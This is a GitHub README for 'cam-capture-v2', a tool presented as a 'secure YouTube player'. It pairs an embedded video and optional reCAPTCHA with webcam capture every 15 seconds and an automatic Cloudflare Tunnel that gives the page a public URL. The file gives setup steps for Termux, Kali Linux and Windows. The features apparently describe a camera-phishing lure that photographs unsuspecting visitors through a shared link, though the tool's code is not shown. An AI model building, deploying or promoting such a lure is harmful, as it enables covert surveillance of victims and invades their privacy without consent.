# cam-capture-v2

Secure YouTube player with optional reCAPTCHA and webcam capture.  
Automatically starts a **Cloudflare Tunnel** for public access. Works on **Termux (Android), Kali Linux, and Windows**.

---

## Features

- Play any YouTube video in a web interface
- Optional dark-themed reCAPTCHA
- Webcam capture every 15 seconds
- Auto Cloudflare Tunnel for public URL
- Change YouTube video link and storage path dynamically
- CLI menu for control

---







## GitHub Clone

Clone the repository:

```bash
git clone https://github.com/Jabed-A1/cam-capture-v2.git
cd cam-capture-v2

```
##Setup Guide for All OS
1. Termux (Android)

Update packages:
```
pkg update && pkg upgrade -y
```

Install Python and Git:
```
pkg install python git -y

```
Install Flask:
```
pip install flask
```

Install Cloudflare Tunnel:
```
pkg install cloudflared -y

```
Run the launcher:
```
python launcher.py

```
Browser may require camera permission.

Cloudflare Tunnel starts automatically.

Public URL is printed in the console.

## 2. Kali Linux / Debian / Ubuntu

Update system:
```
sudo apt update && sudo apt upgrade -y

```
Install Python and pip:
```
sudo apt install python3 python3-pip git -y

```
Install Flask:
```
pip3 install flask

```
Install Cloudflare Tunnel:
```
sudo apt install cloudflared -y

```
Run the launcher:
```
python3 launcher.py

```
Local server at http://127.0.0.1:5000

Cloudflare Tunnel auto-starts and prints public URL.

Browser opens automatically.

## 3. Windows 10 / 11

Install Python: https://www.python.org/downloads/windows/

Ensure “Add Python to PATH” is checked.

Install Flask:
```
pip install flask
```

Install Cloudflare Tunnel: Official instructions

Run the launcher:
```
python launcher.py
```

Local server starts at http://127.0.0.1:5000

Cloudflare Tunnel auto-starts

Public URL printed in console and browser opens automatically


